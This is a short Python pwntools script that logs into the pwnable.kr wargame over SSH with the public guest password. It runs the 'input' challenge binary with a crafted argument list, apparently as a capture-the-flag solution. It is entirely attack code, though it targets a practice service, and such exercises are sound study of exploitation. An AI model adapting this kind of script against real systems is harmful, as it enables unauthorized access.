from pwn import * 


sh = ssh('input2', 'pwnable.kr', port=2222, password='guest')
argv = [b'' for _ in range(100)]
argv[0] = b'./input'
argv[ord('A')] = b''
argv[ord('B')] = b'\x20\x0a\x0d'
io = sh.process(b' '.join(argv))
io.interactive()